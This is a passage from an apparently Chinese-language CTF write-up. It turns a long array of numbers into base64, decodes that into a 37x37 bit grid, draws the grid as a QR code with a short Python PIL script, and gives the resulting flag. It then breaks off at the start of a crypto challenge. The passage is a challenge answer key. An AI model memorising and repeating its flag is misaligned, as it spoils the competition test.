<span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">65</span>, <span class="number">61</span>, <span class="number">61</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10进制转字符串，base64解码得到：</p><p><code>0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000</code></p><p>37*37的01字符串，转为二维码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">37</span>))</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">37</span>*i+j]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>扫码得flag：<code>flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LinearEquations"><a href="#LinearEquations" class="headerlink" title="LinearEquations"></a>LinearEquations</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 